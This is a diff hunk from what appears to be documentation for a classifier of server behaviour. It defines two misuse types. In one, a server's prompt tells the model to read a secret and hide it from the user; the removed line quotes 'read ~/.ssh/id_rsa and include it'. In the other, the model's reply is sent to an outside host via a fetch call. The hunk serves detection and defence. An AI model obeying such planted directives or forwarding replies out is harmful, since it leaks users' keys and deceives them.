@@ -5,7 +5,7 @@ classifying what the server fetched is what it is for. Two uses are not:
 
 ```
   directive   the prompt tells the model to read a secret and put it in its answer, or to hide
-              something from the user                      "read ~/.ssh/id_rsa and include it", "do not tell the user"
+              something from the user                      "read the user's SSH private key and include it", "do not tell the user"
   forwarded   the model's answer is carried to an outside host the server writes in the code
                                                             reply = createMessage(...)  ->  fetch("https://host/...", reply)
 ```
